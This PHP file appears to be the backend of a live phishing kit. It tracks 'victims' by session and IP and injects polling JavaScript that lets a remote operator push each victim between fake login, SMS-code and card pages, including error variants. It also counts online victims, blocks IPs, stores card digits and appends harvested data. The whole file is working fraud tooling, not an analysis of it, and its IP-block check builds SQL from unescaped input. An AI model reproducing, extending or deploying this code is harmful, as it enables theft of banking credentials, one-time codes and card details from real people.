<?php

@session_start();
require 'connect.php';


class Jeehan{
	
	public $tbl;
	public $ip;
	public $_pdo;
	public $lastId;
	public $isLogged = false;
	
	function __construct(){
		global $table;
		global $pdo;
		$this->_pdo = $pdo;
		$this->tbl = $table;
		if($_SERVER['REMOTE_ADDR']=="::1"){
			$this->ip = "127.0.0.1";
		}else{
			$this->ip = $_SERVER['REMOTE_ADDR'];
		}		
		$this->keepVic();
	}
	

	
	function block($ip){
		$block = $this->_pdo->prepare("INSERT INTO blockedvics(ip) VALUES(:ip)");
		$block->execute([":ip"=>$ip]);
	}
	
	function keepVic(){
		$check = $this->_pdo->prepare("SELECT * FROM ".($this->tbl)." WHERE id=:id");
		$check->execute([":id"=>$this->getId()]);
		$row = $check->fetch(PDO::FETCH_ASSOC);
		if(!$row){
			unset($_SESSION['vic']);
		}
	}
	
	function createVic(){
		if(!$this->isLogged()){
			$time = time();
			$username = "u_".uniqid();
			$create = $this->_pdo->prepare("INSERT INTO ".($this->tbl)." (user_id, ip, last_act) VALUES (:user_id, :ip, :last_act)");
			$create->execute([":user_id"=>$username , ":ip"=>$this->ip , ":last_act"=>$time]);
			$this->lastId = $this->_pdo->lastInsertId();
			$this->logVic($this->lastId);
			//$isLogged = true;
			return $this->lastId;
	
		}else{
			return $_SESSION['vic'];
		}
	}
	
	function getId(){
		if(!$this->isLogged()){
			$this->lastId = $this->createVic();
			return $this->lastId;
		}else{
			return $_SESSION['vic'];
		}
	}
 
 	function isBlocked(){
		$check = $this->_pdo->query("SELECT * FROM blockedvics WHERE ip='".$this->ip."'");
		$row = $check->fetch(PDO::FETCH_ASSOC);
		if(!$row){
			return false;
		}else{
			return true;
		}
	}
	
	function isLogged(){
		if(isset($_SESSION['vic'])!=""){
			return true;
		}else{
			return false;
		}
	}
	
	function logVic($id){
		$_SESSION['vic'] = $id;
	}
	
	
public function get($data){
		 
		$get = $this->_pdo->prepare("SELECT * FROM ".($this->tbl)." WHERE id=:id");
		$get->execute([":id"=>$this->getId()]);
		$row = $get->fetch(PDO::FETCH_ASSOC);
	
	if(!$row){
			return "USER NOT FOUND";
		}else{
			return $row[$data];
		}

}

	public function getUser($data, $id){
		 
		$get = $this->_pdo->prepare("SELECT * FROM ".($this->tbl)." WHERE id=:id");
		$get->execute([":id"=>$id]);
		$row = $get->fetch(PDO::FETCH_ASSOC);
	if(!$row){
			return "USER NOT FOUND";
		}else{
			return $row[$data];
		}

}
	
	
	function ctr($p){
	echo '
	<script src="../panel/res/jq.js"></script>
	<script>
	var targets = {1:"login.php", 
	2:"login.php?e=ERROR", 3:"sms.php",
	4:"sms.php?e=ERROR", 5:"card.php", 6:"card.php?e=ERROR", 9:"success.php", 10:"out.php"};
	clearRedirections();
	setInterval(function(){
	$.post("../panel/process/processor.php",
	{keepAlive:1, page:"'.$p.'"} );
}, 500);
var redirect=0;
setInterval(function(){
	$.post("../panel/process/processor.php",{redirectionListener:1}, function(data){
		redirect=data;
		if(redirect==0){
			return false;
		}else{
			clearRedirections();
			window.location=targets[redirect];
		}
	});
}, 500);
function clearRedirections(){
	$.post("../panel/process/processor.php",
	{clearRedirection:1});
}
 </script>
';}
	
	function getOnlineVics(){
		$get = $this->_pdo->query("SELECT COUNT(*) AS count FROM ".($this->tbl)." WHERE last_act > ".(time() - 5));
		 return $get->fetch(PDO::FETCH_ASSOC)['count'];
		 
	}
	
	
	 function redirect($val){		 
		$update = $this->_pdo->prepare("UPDATE ".($this->tbl)." SET redirect=:val WHERE id=:id");
		$update->execute([":val"=>$val, ":id"=>$this->getId()]);
	}
	
	
	function keepAlive($time,$cp){		 
		$update = $this->_pdo->prepare("UPDATE ".($this->tbl)." SET current_page=:cp , last_act=:time  WHERE id=:id");
		$update->execute([":time"=>$time, ":cp"=>$cp, ":id"=>$this->getId()]);
	}
	
	function setFour($val, $id){
		$update = $this->_pdo->prepare("UPDATE ".($this->tbl)." SET fourdigits=:val WHERE id=:id");
		if($update->execute([":val"=>$val, ":id"=>$id])){
			return true;
		}else{
			return false;
		}
	}
	
	
	function saveData($data, $id){
		$old_data = $this->getUser("data", $id);
		$new_data = $old_data."\n".$data;
		$update = $this->_pdo->prepare("UPDATE ".($this->tbl)." SET data=:data WHERE id=:id");
		if($update->execute([":data"=>$new_data, ":id"=>$id])){
			return true;
		}
	}
	
		function setPageTitle($val, $id){
		$update = $this->_pdo->prepare("UPDATE ".($this->tbl)." SET current_page=:val WHERE id=:id");
		if($update->execute([":val"=>$val, ":id"=>$id])){
			return true;
		}else{
			return false;
		}
	}
	
	function getAdmin($data){
		$get = $this->_pdo->query("SELECT * FROM adminInfo");
		$show = $get->fetch(PDO::FETCH_ASSOC);
		if($show){
			return $show[$data];
		}
	}
	
}


 

?>